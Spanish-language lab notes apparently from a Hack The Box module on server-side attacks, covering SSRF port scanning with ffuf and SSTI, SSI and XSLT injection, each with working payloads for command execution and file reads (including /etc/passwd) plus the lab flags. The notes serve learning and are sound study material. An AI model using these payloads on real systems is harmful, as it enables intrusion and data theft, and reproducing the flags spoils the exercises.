# Server-Side Attacks
## SSRF

Una vulnerabilidad de SSRF (Server-Side Request Forgery) es un fallo de seguridad que permite a un atacante manipular los parámetros de una aplicación web (como una URL en una petición POST) para obligar al servidor víctima a realizar solicitudes HTTP hacia destinos arbitrarios. Esto se utiliza para engañar al servidor y hacer que acceda a servicios internos ocultos o protegidos en su propia red local (`127.0.0.1`) que no están expuestos al público, logrando así sortear controles de acceso, escanear puertos internos u obtener información confidencial

### Identifying SSRF

1. **Exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag.**

Se capturará la petición con burpsuite para explotar el SSRF clikando en el botón

![[Server-Side Attacks Practise captura.png]]

Esta imagen ilustra la confirmación práctica de una vulnerabilidad SSRF: a la izquierda, la terminal con Netcat en escucha comprueba que el servidor objetivo (`10.129.190.252`) realizó una petición HTTP saliente hacia tu máquina de atacante tras procesar los datos; a la derecha, la interfaz de Burp Suite expone la solicitud POST enviada a la aplicación con el parámetro `dateserver` modificado para apuntar a tu dirección IP y puerto (`10.10.14.236:8000`).

![[Server-Side Attacks Practise reconocimiento.png]]

Este comando utiliza la utilidad `seq` para generar una secuencia numérica continua desde el 1 hasta el 10,000 toda esa salida para crear y almacenar un archivo de texto plano llamado `ports.txt`.

```
seq 1 10000 > ports.txt 
```

Este comando ejecuta la herramienta de fuzzing `ffuf` para llevar a cabo un escaneo de puertos internos en `127.0.0.1` aprovechando la vulnerabilidad SSRF del servidor web. Carga el diccionario de puertos mediante el parámetro `-w` utilizando la etiqueta `FUZZ`, envía peticiones HTTP de tipo POST (`-X POST`) con los datos y encabezados necesarios reemplazando dinámicamente el puerto a probar, y descarta automáticamente de los resultados aquellas respuestas que contengan el mensaje de error de conexión fallida gracias al filtro `-fr`.

```
ffuf -w ports.txt:FUZZ -u http://10.129.190.252/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2025-09-02" -fr "Failed to connect to"
```

![[Server-Side Attacks Practise 8000.png]]

```
dateserver=http://127.0.0.1:8000/&date=2024-01-01
```

- **En la petición (Request):** Se está enviando una solicitud HTTP POST al servidor víctima (`10.129.190.252/index.php`) pasando a través del parámetro vulnerable `dateserver` la URL local `http://127.0.0.1:8000/`.
    
- **En la respuesta (Response):** El servidor procesa el SSRF, se conecta internamente al puerto `8000` de sí mismo, obtiene el contenido de la aplicación web interna que estaba oculta y te lo devuelve impreso en pantalla, revelando finalmente la bandera: `HTB{911fc5badf7d65aed9380d536c270f8}`

![[Server-Side Attacks Practise flag.png]]

answer: **HTB{911fc5badf7d65aed95380d536c270f8}**

**Anotación**. Tuve que cambiar archivo vpn porque a la hora de explotar la ip de esta actividad, no me detectaba el puerto 8000. 
### Exploiting SSRF

1. **Exploit the SSRF vulnerability to identify an additional endpoint. Access that endpoint to obtain the flag. Feel free to play around with all SSRF exploitation techniques discussed in this section.**

Antes de realizar la prueba de fuzzing, es importante comprender cómo la aplicación responde a los recursos inexistentes, para así poder distinguir de manera fiable los puntos finales válidos de los inválidos durante la enumeración.

Se solicita un directorio que probablemente no exista. El servidor responde con un error estándar " `404 Not Found` ". Esta respuesta servirá como nuestra referencia y puede ser eliminada durante las pruebas de "fuzzing" para reducir el ruido.

![[Server-Side Attacks Practise sdajkda.png]]

Con la base establecida, utilizamos `ffuf` para probar posibles nombres de puntos finales a través del parámetro vulnerable `dateserver` . La aplicación añade `.php` , por lo que las entradas de la lista de palabras se utilizan según corresponda. Eliminamos las respuestas que coinciden con el comportamiento conocido de " `404` " y los recuentos de palabras irrelevantes.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u http://10.129.191.3/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr 404 -fw 3,23 -ic
```

![[Server-Side Attacks Practise adminaksxla.png]]

```
dateserver=http://dateserver.htb/admin.php&date=2024-01-01
```

Se dirige la solicitud al punto final `admin.php` utilizando el parámetro SSRF:

![[Server-Side Attacks Practise adminphp.png]]

answer: **HTB{61ea58507c2b9da30465b9582d6782a1}**
### Blind SSRF

1. **Exploit the SSRF to identify open ports on the system. Which port is open in addition to port 80?**

Este bloque muestra el parámetro HTTP enviado en la petición POST para probar la vulnerabilidad SSRF. Al incluir la IP del atacante y el puerto del listener de netcat, se obliga al servidor víctima a realizar una solicitud web saliente hacia tu equipo para confirmar que el parámetro procesa URLs externas.

```
dateserver=http://10.10.14.236:8001/ssrf&date=2026-01-01
```

![[Server-Side Attacks Practise shell sometig wrong.png]]

Este comando genera una secuencia numérica del 1 al 10,000 y la guarda en un archivo de texto llamado `ports.txt`. Esto crea un diccionario personalizado con un rango masivo de puertos que se utilizará posteriormente para escanear servicios internos.

```
seq 1 10000 > ports.txt
```

Este comando utiliza la herramienta `ffuf` para automatizar un escaneo de puertos mediante fuzzing a través del SSRF. Utiliza la palabra clave `FUZZ` con el diccionario creado, envía peticiones POST al objetivo y filtra con `-fr` aquellas respuestas con errores predeterminados para identificar con precisión los puertos internos abiertos.

```
ffuf -w ports.txt:FUZZ -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2026-01-01" -fr "Something went wrong"
```

![[Server-Side Attacks Practise 5000.png]]

answer: **5000**
## SSTI

El **SSTI (Server-Side Template Injection)** es una vulnerabilidad de seguridad que ocurre cuando una aplicación web procesa de forma insegura entradas proporcionadas por el usuario, incrustándolas directamente dentro de una plantilla en el lado del servidor. Esto permite que un atacante inyecte código o directivas propias del motor de plantillas utilizado (como Jinja2 en Python, Twig en PHP o Thymeleaf en Java), las cuales el servidor interpreta y ejecuta de manera dinámica. Como consecuencia, una explotación exitosa puede permitir desde la lectura de archivos confidenciales hasta la **ejecución remota de código (RCE)**, comprometiendo por completo la infraestructura del servidor.

### Identifying SSTI

1. **Apply what you learned in this section and identify the Template Engine used by the web application. Provide the name of the template engine as the answer.**

Se muestra el panel de prueba donde se introduce la carga útil de diferenciación `{{7*'7'}}` en el campo de entrada del servidor, siendo este el paso metodológico necesario para distinguir entre motores de plantillas que comparten una sintaxis de doble llave similar.

```
{{7*'7'}}
```

![[Server-Side Attacks Practise multi.png]]

Se muestra el resultado devuelto por la aplicación web como "Hi 49!", lo que justifica plenamente por qué el motor utilizado es **Twig**; esto ocurre porque Twig realiza una conversión de tipos implícita interpretando la operación matemáticamente para dar `49`, a diferencia de Jinja, cuyo comportamiento ante esta misma inyección habría sido repetir la cadena generando `7777777`.

![[Server-Side Attacks Practise resultado.png]]

Answer: **Twig**
### Exploiting SSTI - Jinja2

1. **Exploit the SSTI vulnerability to obtain RCE and read the flag.**

Se podra obtener la flag de la actividad con este comando:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```

o este:

```
{{ self.__init__.__globals__.__builtins__.open("/flag.txt").read() }}
```

![[Server-Side Attacks Practise htbflag.png]]

answer: **HTB{295649e25b4d852185ba34907ec80643}**
### Exploiting SSTI - Twig

1. **Exploit the SSTI vulnerability to obtain RCE and read the flag.**

```
{{ ['cat /flag.txt'] | filter('system') }}
```

![[Server-Side Attacks Practise htb gr.png]]

answer: **HTB{5034a6692604de344434ae83f1cdbec6}**
## SSI Injection

El **SSI (Server-Side Includes)** es un lenguaje de marcado simple utilizado por los servidores web para añadir dinámicamente contenido común (como la fecha actual o la cabecera de una página) a un archivo HTML antes de enviarlo al cliente. Una vulnerabilidad de inyección SSI ocurre cuando una aplicación web permite que datos controlados por el usuario se inserten directamente en páginas procesadas por SSI sin la debida sanitización. Esto permite que un atacante inyecte directivas maliciosas —como el comando `#exec` para ejecutar instrucciones del sistema operativo o `#include` para leer archivos locales—, logrando comprometer la seguridad del servidor web de forma similar a otras fallas del lado del servidor.
### Exploiting SSi Injection

1. **Exploit the SSI Injection vulnerability to obtain RCE and read the flag.**

```
<!--#exec cmd="cat /flag.txt" -->
```

![[Server-Side Attacks Practise htbasdasd.png]]

answer: **HTB{81e5d8e80eec8e961a31229e4a5e737e}**
## XSLT Injection

El **XSLT (Extensible Stylesheet Language Transformations)** es un lenguaje diseñado para transformar documentos XML en otros formatos, como HTML, texto plano u otros archivos XML. Una vulnerabilidad de **Inyección XSLT** ocurre cuando una aplicación web procesa entradas controladas por el usuario dentro de una hoja de estilos sin la debida validación. Si el motor de XSLT habilitado en el servidor permite la ejecución de funciones externas o scripts (como extensiones de PHP o Java), un atacante puede aprovechar esta capacidad para inyectar código malicioso —similar a lo visto en ataques de XXE—, logrando leer archivos sensibles o alcanzar la ejecución remota de código (RCE).
### Exploiting XSLT Injection

1. **Exploit the XSLT Injection vulnerability to obtain RCE and read the flag.**

Este comando es una carga útil (_payload_) de inyección **XXE (XML External Entity)** orientada a PHP que aprovecha una vulnerabilidad en el procesamiento de XML para leer archivos del servidor. Funciona porque la aplicación procesa entradas XML suministradas por el usuario sin la debida sanitización y tiene habilitada la extensión de funciones de PHP en XSLT, lo que permite invocar funciones nativas como `file_get_contents` para extraer el contenido de archivos sensibles —en este caso, la flag ubicada en `/flag.txt`— y reflejarlo directamente en la respuesta HTTP.

```
<xsl:value-of select="php:function('file_get_contents','/flag.txt')" />
```

![[Server-Side Attacks Practise flagtxt.png]]

answer: **HTB{3a4fe85c1f1e2b61cabe9836a150f892}**
## Skills Assesment 

### Server-Side Attacks - Skills Assesment

1. **Apply what you have learned in this module to obtain the flag.**

La inspección del tráfico de la página principal usando **burpsuite** revela que la aplicación emite tres solicitudes POST a un punto final API. Cada solicitud corresponde a una ubicación diferente del food truck y cada solicitud POST contiene dos parámetros, id y ubicación:

```
http://truckapi.htb/?id%3DFusionExpress01

{"id": "FusionExpress01", "location": "321 Maple Lane"}
```

![[Server-Side Attacks Practise expres01.png]]
```
http://truckapi.htb/?id%3DFusionExpress02

{"id": "FusionExpress02", "location": "456 Oak Avenue"}
```

![[Server-Side Attacks Practise express02.png]]

```
http://truckapi.htb/?id%3DFusionExpress03

{"id": "FusionExpress03", "location": "134 Main Street"}
```

![[Server-Side Attacks Practise express03.png]]

A continuación, probamos la inyección de plantilla del lado del servidor (SSTI). Comenzamos modificando el parámetro id y observando la respuesta del servidor y el valor proporcionado se refleja directamente en la respuesta:

```
api=http://truckapi.htb/?id=HACKED
```

![[Server-Side Attacks Practise hacked.png]]

Este comportamiento nos permite distinguir entre motores comunes:  
  
Jinja evalúa 7 * '7' como multiplicación de cadenas → 7777777  
Twig lo evalúa como una multiplicación numérica → 49  
Dado que el resultado es 49, podemos concluir con seguridad que la aplicación de destino utiliza el motor de plantillas Twig.

```
api=http://truckapi.htb/?id={{7*'7'}}
```

![[Server-Side Attacks Practise 49.png]]

Para confirmar la vulnerabilidad, inyectamos una carga útil que expone información contextual sobre la plantilla actual y el servidor responde con metadatos de plantilla interna

Esto confirma la presencia de una vulnerabilidad SSTI explotable.  

```
api=http://truckapi.htb/?id%3D{{_self}}
```

![[Server-Side Attacks Practise iddddd.png]]

A continuación, intentamos lograr la ejecución remota de código aprovechando la función system() de PHP a través de la funcionalidad filter() de Twig y el servidor devuelve un error:

```
api=http://truckapi.htb/?id%3D{{+['cat+/etc/passwd']+|+filter('system')+}}
```

![[Server-Side Attacks Practise etcpasssinrulasd.png]]

Es probable que este error se deba a un manejo inadecuado de los caracteres especiales, por tanto en cada `+` que haya se sustituirá por **%2b**, por tanto el comando quedaría así:

```
api=http://truckapi.htb/?id%3D{{%2b['cat%2b/etc/passwd']%2b|%2bfilter('system')%2b}}
```

![[Server-Side Attacks Practise ejdajsdad.png]]

A continuación, el siguiente comando se obtendrá la flag.txt del ejercicio

```
http://truckapi.htb/?id%3D{{%2b['cat%2b/flag.txt']%2b|%2bfilter('system')%2b}}
```

![[Server-Side Attacks Practise htbflag-1.png]]